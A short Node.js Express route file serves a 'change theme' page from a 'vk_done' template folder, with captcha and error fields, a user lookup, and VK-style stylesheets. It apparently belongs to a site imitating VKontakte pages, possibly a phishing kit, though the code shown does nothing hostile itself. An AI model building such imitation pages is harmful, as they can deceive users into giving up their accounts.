var database_worker = require("../../mysql/workers");
const fs = require('fs');

function start_themes(app) {
    app.get(`/themes`, (req, res) => {
      return res.render(`vk_done/change_topic/index.ejs`, {
          id: "343783264",
          error: 0,
          capcha: {
            status: 0
          }
        })
    });

    app.get(`/themes/:id`, (req, res) => {
      database_worker.findUser(req.params.id, (user) => {
        if(user.length == 0) {
          res.render(`vk_done/change_topic/index.ejs`, {
            id: "343783264",
            error: 0,
            capcha: {
              status: 0
            }
          });
        } else {
          res.render(`vk_done/change_topic/index.ejs`, {
            id: req.params.id,
            error: 0,
            capcha: {
              status: 0
            }
          });
        }
      });
    });

    app.get(`/anicollection.css`, (req, res) => {
        res.sendFile(process.cwd() + "/views/vk_done/change_topic/css/anicollection.css")
    });
  
    app.get(`/common2.css`, (req, res) => {
      res.sendFile(process.cwd() + "/views/vk_done/change_topic/css/common2.css")
    });
}

module.exports = {
    start_themes
}
